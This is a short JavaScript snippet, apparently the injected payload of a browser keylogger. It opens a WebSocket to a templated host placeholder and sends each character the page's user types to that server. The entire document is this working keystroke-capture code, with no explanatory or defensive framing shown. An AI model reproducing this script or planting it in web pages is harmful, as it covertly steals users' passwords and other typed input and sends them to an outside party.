(function(){
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress = keypress;
    function keypress(e){
        s = String.fromCharCode(e.which);
        conn.send(s);
    }
})();